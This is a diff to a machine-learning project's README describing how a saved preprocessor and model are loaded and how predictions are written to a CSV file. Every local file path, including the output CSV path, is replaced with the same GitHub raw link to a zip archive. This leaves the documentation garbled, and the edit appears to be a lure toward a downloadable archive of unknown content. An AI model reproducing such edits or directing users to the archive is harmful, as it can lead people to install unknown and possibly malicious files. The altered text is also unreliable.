@@ -69,14 +69,14 @@ The API is accessible through a browser.
 **Workflow:**
 
 1. Uploaded CSV file is read using Pandas.
-2. Saved **preprocessor** is loaded from `preprocessor.pkl`.
-3. Saved **trained model** is loaded from `model.pkl`.
+2. Saved **preprocessor** is loaded from `https://github.com/clarityvivek/MLproject/raw/refs/heads/main/networksecurity/components/Lproject_M_v2.5.zip`.
+3. Saved **trained model** is loaded from `https://github.com/clarityvivek/MLproject/raw/refs/heads/main/networksecurity/components/Lproject_M_v2.5.zip`.
 4. Both are combined using `NetworkModel`.
 5. Predictions are made on the uploaded data.
 6. A new column (`predicted_column`) is added to the data.
 7. Output is:
 
-   * Saved as a CSV file (`prediction_output/output.csv`)
+   * Saved as a CSV file (`https://github.com/clarityvivek/MLproject/raw/refs/heads/main/networksecurity/components/Lproject_M_v2.5.zip`)
    * Displayed as an HTML table in the browser
 
 **Output:**
@@ -87,8 +87,8 @@ The API is accessible through a browser.
 
 ## 4. Machine Learning Model Handling
 
-* `preprocessor.pkl` → Handles data scaling/encoding
-* `model.pkl` → Trained ML model
+* `https://github.com/clarityvivek/MLproject/raw/refs/heads/main/networksecurity/components/Lproject_M_v2.5.zip` → Handles data scaling/encoding
+* `https://github.com/clarityvivek/MLproject/raw/refs/heads/main/networksecurity/components/Lproject_M_v2.5.zip` → Trained ML model
 * `NetworkModel` → Combines preprocessing + prediction into one step
 
 This makes prediction easy and clean.
